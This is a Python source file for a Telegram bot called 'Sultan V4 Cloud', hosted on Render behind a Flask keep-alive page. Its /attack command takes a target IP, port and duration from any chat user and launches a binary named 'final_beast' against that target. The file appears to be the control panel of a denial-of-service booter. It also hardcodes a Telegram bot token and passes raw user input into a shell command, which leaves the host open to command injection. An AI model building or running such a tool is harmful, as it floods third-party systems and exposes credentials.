import telebot, subprocess, time, threading, os
from flask import Flask

# Bot Token
TOKEN = "8586393188:AAF-zC6xKyiaLil7pd_0tEbooy9jYBAFxqA"
bot = telebot.TeleBot(TOKEN)

# Render Keep-Alive Server
app = Flask('')
@app.route('/')
def home():
    return "Sultan V4 Cloud is Active!"

def run():
    # Render hamesha PORT environment variable deta hai
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "🔱 **SULTAN CLOUD LIVE** 🔱\n🚀 Bot ab 24/7 server par hai!")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    args = message.text.split()
    if len(args) < 4: return
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **Attack Started:** `{ip}:{port}`")
    subprocess.Popen(f"chmod +x final_beast && ./final_beast {ip} {port} {dur}", shell=True)

if __name__ == "__main__":
    # Web server background mein chalayega
    threading.Thread(target=run).start()
    print("✅ Sultan is starting...")
    bot.polling(none_stop=True)
